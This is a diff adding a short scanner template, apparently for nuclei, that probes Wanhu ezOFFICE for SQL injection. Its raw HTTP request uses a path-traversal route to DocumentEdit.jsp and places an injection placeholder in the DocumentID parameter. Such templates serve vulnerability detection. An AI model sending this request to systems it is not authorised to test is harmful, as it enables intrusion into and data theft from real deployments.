@@ -1,0 +1,21 @@
+id: poc-yaml-wanhu-ezoffice-documentedit-sqli
+
+info:
+  name: poc-yaml-wanhu-ezoffice-documentedit-sqli
+  author: socat
+  severity: high
+  tags: xray-converted,sqli,ct-479129
+  reference:
+    - http://124.223.89.192/archives/ezoffice02
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID={{sql}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
